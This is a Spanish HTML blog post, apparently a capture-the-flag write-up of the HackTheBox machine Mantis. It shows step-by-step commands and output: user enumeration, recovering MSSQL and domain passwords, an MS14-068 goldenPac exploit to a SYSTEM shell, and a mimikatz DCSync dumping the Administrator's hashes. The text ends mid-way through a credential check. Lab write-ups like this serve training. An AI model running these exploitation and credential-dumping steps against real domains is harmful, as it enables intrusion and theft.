@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Mantis</title>
+
+  <meta name="description" content="Resolución de la máquina Mantis de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Mantis">
+  <meta name="twitter:description" content="Resolución de la máquina Mantis de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mantis.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Mantis">
+  <meta property="og:description" content="Resolución de la máquina Mantis de la plataforma de HackTheBox">
+  <meta property="og:image" content="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mantis.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mantis.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Mantis" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#access-admin">Access - admin</a></li>
+        <li><a href="#access-james">Access - james</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+        <li><a href="#extra1">Extra - RDP Administrator</a></li>
+        <li><a href="#altern-administrator">Alternativa - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/mantis.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Mantis</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos de AD abiertos entre ellos <code class="language-plaintext highlighter-rouge">smb</code>, <code class="language-plaintext highlighter-rouge">kerberos</code> y otros</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.10.52
+Nmap scan report for 10.10.10.52  
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+1337/tcp  open  waste
+1433/tcp  open  ms-sql-s
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5722/tcp  open  msdfsr
+8080/tcp  open  http-proxy
+9389/tcp  open  adws
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49166/tcp open  unknown
+49170/tcp open  unknown
+49174/tcp open  unknown
+50255/tcp open  unknown</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos obtener información de la maquina asi como el <code class="language-plaintext highlighter-rouge">dominio</code> que es <code class="language-plaintext highlighter-rouge">htb.local</code> ademas del nombre que parece es <code class="language-plaintext highlighter-rouge">mantis</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.52
+</span><span class="az">SMB         </span><span class="p">10.10.10.52      445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Para posibles proximos ataques o solo por comodidad agregaremos el <code class="language-plaintext highlighter-rouge">dominio</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> ademas el nombre de la máquina <code class="language-plaintext highlighter-rouge">mantis</code> como otro dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.10.52 htb.local mantis.htb.local"</span><span class="p"> | </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al usar <code class="language-plaintext highlighter-rouge">kerbrute</code> pasandole un dicceionario de <code class="language-plaintext highlighter-rouge">usuarios</code> perteneciente a el repo de <code class="language-plaintext highlighter-rouge">seclists</code> logramos identificar solo a <code class="language-plaintext highlighter-rouge">3</code> usuarios existentes de parte del dominio</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ kerbrute </span><span class="p">userenum -d htb.local --dc mantis.htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+>  Using KDC(s):
+>       mantis.htb.local:88
+</span><span class="ve">
+>  [+] VALID USERNAME:   administrator@htb.local
+>  [+] VALID USERNAME:   james@htb.local
+>  [+] VALID USERNAME:   mantis@htb.local</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Con una lista de usuarios podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast</code>, ninguno es vulnerable</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-GetNPUsers </span><span class="p">htb.local/ -no-pass -usersfile users.txt
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mantis doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El puerto <code class="language-plaintext highlighter-rouge">8080</code> esta abierto en la máquina, sin embargo despues de buscar y probar diferentes vulnerabilidades no encontramos absolutamente nada interesante</p>
+<a href="/htb/mantis/6.png" target="_blank"><div><p><img src="/htb/mantis/6.png"></p></div></a>
+
+<p class="plain-text">También tenemos el puerto <code class="language-plaintext highlighter-rouge">1337</code> abierto, este puerto tambien corre una pagina web sin embargo la principal es solo un simple panel de <code class="language-plaintext highlighter-rouge">IIS</code> version 7 por defecto</p>
+<a href="/htb/mantis/1.png" target="_blank"><div><p><img src="/htb/mantis/1.png"></p></div></a>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">wfuzz</code> podemos encontrar 2 directorios, sin embargo el directorio <code class="language-plaintext highlighter-rouge">orchard</code> nos devuelve un codigo de estado 500. <code class="language-plaintext highlighter-rouge">secure_notes</code> que nos devuelve un <code class="language-plaintext highlighter-rouge">301</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://mantis.htb.local:1337/FUZZ -t 100 --hc 404  
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://mantis.htb.local:1337/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000024818:   </span><span class="sa">500</span><span class="p">        72 L     241 W      3026 Ch     "orchard"
+000095776:   </span><span class="az">301</span><span class="p">        1 L      10 W       165 Ch      "secure_notes"</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al abrir el directorio <code class="language-plaintext highlighter-rouge">/secure_notes</code> podemos encontrar 2 archivos, el primero es un archivo con doble extensión <code class="language-plaintext highlighter-rouge">.txt</code> y el otro un <code class="language-plaintext highlighter-rouge">web.config</code> que llama la atencion</p>
+<a href="/htb/mantis/2.png" target="_blank"><div><p><img src="/htb/mantis/2.png"></p></div></a>
+
+<p class="plain-text">Aunque el <code class="language-plaintext highlighter-rouge">web.config</code> parece bastante interesante al abrirla nos devuelve <code class="language-plaintext highlighter-rouge">404</code></p>
+<a href="/htb/mantis/4.png" target="_blank"><div><p><img src="/htb/mantis/4.png"></p></div></a>
+
+</section>
+
+<section class="post" id="access-admin">
+<br><h3 class="post-title">Access - admin</h3><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">.txt</code> contiene algunas notas, la numero 2 es bastante interesante, nos habla de algo de descargar <code class="language-plaintext highlighter-rouge">MSSQLServer</code>, crear un usuario <code class="language-plaintext highlighter-rouge">admin</code> y una db</p>
+<a href="/htb/mantis/3.png" target="_blank"><div><p><img src="/htb/mantis/3.png"></p></div></a>
+
+<p class="plain-text">Lo interesante esta en el nombre del archivo, este es un <code class="language-plaintext highlighter-rouge">base64</code> que al decodearlo nos deja una cadena en <code class="language-plaintext highlighter-rouge">hexadecimal</code> y al decodearla parece una <code class="language-plaintext highlighter-rouge">contraseña</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="p">NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | </span><span class="ve">base64</span><span class="p"> -d
+6d2424716c5f53405f504073735730726421
+
+</span><span class="ve">❯ echo </span><span class="p">NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | </span><span class="ve">base64</span><span class="p"> -d | </span><span class="ve">xxd</span><span class="p"> -ps -r  
+m$$ql_S@_P@ssW0rd!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las notas nos dice que el usuario es <code class="language-plaintext highlighter-rouge">admin</code>, asi que con <code class="language-plaintext highlighter-rouge">crackmapexec</code> comprobamos la contraseña para la <code class="language-plaintext highlighter-rouge">db</code>, esta autenticacion devuelve que es valida</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">mssql mantis.htb.local -u admin -p </span><span class="am">'m$$ql_S@_P@ssW0rd!'</span><span class="p"> --local-auth
+</span><span class="az">MSSQL       </span><span class="p">htb.local       1433   MANTIS           </span><span class="az">[*] </span><span class="p">Windows 6.1 Build 7601 (name:MANTIS) (domain:MANTIS)  
+</span><span class="az">MSSQL       </span><span class="p">htb.local       1433   MANTIS           </span><span class="ve">[+] </span><span class="p">admin:m$$ql_S@_P@ssW0rd!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente usar <code class="language-plaintext highlighter-rouge">mssqlclient</code> para conectarnos como el usuario <code class="language-plaintext highlighter-rouge">admin</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-mssqlclient </span><span class="p">htb.local/admin:</span><span class="am">'m$$ql_S@_P@ssW0rd!'</span><span class="p">@mantis.htb.local
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.  
+[*] ACK: Result: 1 - Microsoft SQL Server (120 7208)
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="access-james">
+<br><h3 class="post-title">Access - james</h3><br>
+
+<p class="plain-text">Como este usuario no podemos habilitar el modulo <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos, iniciaremos enumerando las <code class="language-plaintext highlighter-rouge">bases de datos</code> existentes en el servidor</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sysdatabases;
+
+name
+--------------------------------------------------------------------------  
+
+master
+tempdb
+model
+msdb
+orcharddb
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya que solo parece interesante la base de datos <code class="language-plaintext highlighter-rouge">orcharddb</code> nos conectamos a ella con <code class="language-plaintext highlighter-rouge">use</code>, ya que el resto son las bases de datos que vienen por <code class="language-plaintext highlighter-rouge">defecto</code> en mssql</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> use orcharddb;
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
+[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.  
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Enumerando las <code class="language-plaintext highlighter-rouge">tablas</code> de las bases de datos <code class="language-plaintext highlighter-rouge">orcharddb</code> podemos filtrar por aquellas que tengas la string <code class="language-plaintext highlighter-rouge">user</code> en ellas, solo encontramos <code class="language-plaintext highlighter-rouge">2</code> con esta condicion</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sys.tables where name like '%user%';
+
+name
+--------------------------------------------------------------------------  
+
+blog_Orchard_Users_UserPartRecord
+blog_Orchard_Roles_UserRolesPartRecord
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente listamos las <code class="language-plaintext highlighter-rouge">columnas</code> de una de las tablas anteriores, la cual contiene posibles credenciales de usuarios en las columnas <code class="language-plaintext highlighter-rouge">UserName</code> y <code class="language-plaintext highlighter-rouge">Password</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select name from sys.columns where object_id = object_id('blog_Orchard_Users_UserPartRecord');  
+
+name
+--------------------------------------------------------------------------
+
+Id
+UserName
+Email
+NormalizedUserName
+Password
+PasswordFormat
+HashAlgorithm
+PasswordSalt
+RegistrationStatus
+EmailStatus
+EmailChallengeToken
+CreatedUtc
+LastLoginUtc
+LastLogoutUtc
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al leer el contenido de estas <code class="language-plaintext highlighter-rouge">columnas</code> podemos encontrar 2 posibles credenciales validas, las de <code class="language-plaintext highlighter-rouge">admin</code> en base64 y las del usuario <code class="language-plaintext highlighter-rouge">James</code> en texto claro</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">SQL> select username,password from blog_Orchard_Users_UserPartRecord
+
+username                          password
+--------------------------------- ----------------------------------------------------------------------  
+
+admin                              AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
+James                              J@m3s_P@ssW0rd!
+
+SQL></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Las credenciales del usuario <code class="language-plaintext highlighter-rouge">James</code> son validas, sin embargo al listar los recursos compartidos por <code class="language-plaintext highlighter-rouge">SMB</code> no tenemos privilegios realmente interesantes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb mantis.htb.local -u James -p J@m3s_P@ssW0rd!
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">htb.local\James:J@m3s_P@ssW0rd!
+
+</span><span class="ve">❯ crackmapexec </span><span class="p">smb mantis.htb.local -u James -p J@m3s_P@ssW0rd! --shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">htb.local\James:J@m3s_P@ssW0rd!
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">Enumerated shares
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">Share           Permissions     Remark
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">-----           -----------     ------
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">ADMIN$                          Remote Admin
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">C$                              Default share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">IPC$                            Remote IPC
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">NETLOGON        READ            Logon server share
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">SYSVOL          READ            Logon server share</span>
+</code></pre></div></div><br>
+</section>
+
+<section class="post" id="shell-administrator">
+<br><h3 class="post-title">Shell - Administrator</h3><br>
+
+<p class="plain-text">Curiosamente el usuario <code class="language-plaintext highlighter-rouge">James</code> pertenece al grupo <code class="language-plaintext highlighter-rouge">Remote Desktop Users</code>, sin embargo el puerto <code class="language-plaintext highlighter-rouge">3389</code> no esta abierto por lo que no podemos conectarnos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb mantis.htb.local -u James -p J@m3s_P@ssW0rd! --groups </span><span class="am">'Remote Desktop Users'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">htb.local\James:J@m3s_P@ssW0rd!
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="ve">[+] </span><span class="p">Enumerated members of domain group
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="am">htb.local\james</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La via principal es explotar la máquina es a través del <a href="https://adsecurity.org/?p=541">MS14-068</a>, podemos usar <code class="language-plaintext highlighter-rouge">goldenPac</code> pasandole las credenciales de <code class="language-plaintext highlighter-rouge">James</code> y obtener una shell como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code>, usuario que tiene maximos privilegios sobre el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-goldenPac </span><span class="p">htb.local/James:</span><span class="am">'J@m3s_P@ssW0rd!'</span><span class="p">@mantis.htb.local  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
+[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
+[*] Attacking domain controller mantis.htb.local
+[*] mantis.htb.local found vulnerable!
+[*] Requesting shares on mantis.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file UUQRfehy.exe
+[*] Opening SVCManager on mantis.htb.local.....
+[*] Creating service FNmo on mantis.htb.local.....
+[*] Starting service FNmo.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32></span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\James\Desktop\user.txt
+552**************************e4a
+
+C:\Windows\system32></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+6a1**************************50d
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="extra1">
+<br><h3 class="post-title">Extra - RDP Administrator</h3><br>
+
+<p class="plain-text">Solo como extra para no estar explotando la vulnerabilidad en cada conexión podemos hacer un <code class="language-plaintext highlighter-rouge">DCSync</code> para dumpear los hashes NT usando <code class="language-plaintext highlighter-rouge">mimikatz</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">C:\Windows\system32> </span><span class="am">.\mimikatz.exe </span><span class="az">'lsadump::dcsync /domain:htb.local /user:Administrator' </span><span class="p">exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(commandline) # lsadump::dcsync /domain:htb.local /user:Administrator
+[DC] 'htb.local' will be the domain
+[DC] 'mantis.htb.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
+Account expiration   : 
+Password last change : 2/6/2018 3:52:39 AM
+Object Security ID   : S-1-5-21-4220043660-4019079961-2895681657-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 22140219fd9432e584a355e54b28ecbb
+    ntlm- 0: 22140219fd9432e584a355e54b28ecbb
+    ntlm- 1: f56a8399599f1be040128b1dd9623c29
+    ntlm- 2: 22140219fd9432e584a355e54b28ecbb
+    ntlm- 3: cd8ec6b5d31a65994f198224737c1b5a
+    ntlm- 4: 22140219fd9432e584a355e54b28ecbb
+    ntlm- 5: cf3a5525ee9414229e66279623ed5c58
+    lm  - 0: d462d8b323bb51510a7e8bc8b78f6154
+    lm  - 1: 992508e37a5fe21fc43aa779f6031fcf
+    lm  - 2: 7a55e665909f967c03ad0faa4025fd6f
+    lm  - 3: ece24f1ea376fd00e95f53c0a21c7d8e
+    lm  - 4: a130c51333587a4956555979c1cda480
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : HTB.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c06d7bb2e780b417445f0f55c52399de2dbd206a383be45d407b376356cd9170  
+      aes128_hmac       (4096) : ea5a1c528034eac55c6e97af85773352
+      des_cbc_md5       (4096) : c2d65b4f7abab392
+    OldCredentials
+      aes256_hmac       (4096) : 943f155d96b74437cf7f8337497f42bfbac0b2f8d551c0f906f847434302d42a  
+      aes128_hmac       (4096) : 260bf306c1643ff85170c18353fc0ef5
+      des_cbc_md5       (4096) : b35b381cbf4c8ff2
+    OlderCredentials
+      aes256_hmac       (4096) : c06d7bb2e780b417445f0f55c52399de2dbd206a383be45d407b376356cd9170  
+      aes128_hmac       (4096) : ea5a1c528034eac55c6e97af85773352
+      des_cbc_md5       (4096) : c2d65b4f7abab392
+
+* Primary:Kerberos *
+    Default Salt : HTB.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : c2d65b4f7abab392
+    OldCredentials
+      des_cbc_md5       : b35b381cbf4c8ff2
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  5214ac55f3b2f763612bbfc12dc8a2b4
+    02  47a3dfd25f8cd6020aafeca790c2e27a
+    03  ab6c6ea069d99a6df69432c4f75976fd
+    04  5214ac55f3b2f763612bbfc12dc8a2b4
+    05  29d0d4558cfba2257d9749cd7a2ceb6a
+    06  71c24c1c8ba550b44d1d99abe9c7f274
+    07  60111235e0f941902575bcbee335a5ee
+    08  b8d1648b1dac1a92685006a3622c8b7c
+    09  5d99cee1f7ffb69af0247b064d0dc30d
+    10  2d964bc7d89e3a7a3ddc93734b710787
+    11  4a22420260805ce56e6b08f47ef2db1d
+    12  b8d1648b1dac1a92685006a3622c8b7c
+    13  7ad40f526cf067ab26ecd128766e338e
+    14  0b7386c5d6fed7b938b141319bc38036
+    15  fbbbf0f351e7d5032f55fe36d9df8abc
+    16  afac3f0dd33110c906f84d724a742ec4
+    17  9b95750d79dfa943a1217de22e097b12
+    18  b8f019e7d12052c11f40659837d0606f
+    19  9d8f977f6094c090dde998735c190662
+    20  7794bcc0b9cbef4a5f6cb3c717144841
+    21  572e13ce86b45c7836b6a565b53bda58
+    22  1283dcc8c6086e162b139653455cd46f
+    23  fa1622ffc909bf5d7d8665f02139a910
+    24  b6117ad4c4231121a03377c055857e2f
+    25  9226bbbd506776a25b6cf913a6e87f76
+    26  9a372aed3608ab95de7a4552f724ed79
+    27  280fd1b59b2673a617da0083ad5bb258
+    28  2420ad61bf753115a3622738f23f5800
+    29  153b0bf7884b442fc81a265a3c8effba
+
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al pasarle el <code class="language-plaintext highlighter-rouge">hash</code> NT del usuario Administrator a <a href="https://crackstation.net/">crackstation</a> este logra crackearlo</p>
+<a href="/htb/mantis/5.png" target="_blank"><div><p><img src="/htb/mantis/5.png"></p></div></a>
+
+<p class="plain-text">Comprobamos la contraseña de Administrator con <code class="language-plaintext highlighter-rouge">crackmapexec</code> y devuelve Pwn3d!</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb mantis.htb.local -u Administrator -p </span><span class="am">'@dm!n!$tr@t0r'</span><span class="p">
+</span><span class="az">SMB         </span><span class="p">htb.local       445    MANTIS           </span><span class="az">[*] </span><span class="p">Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:MANTIS) (domain:htb.local) (signing:True) (SMBv1:True)
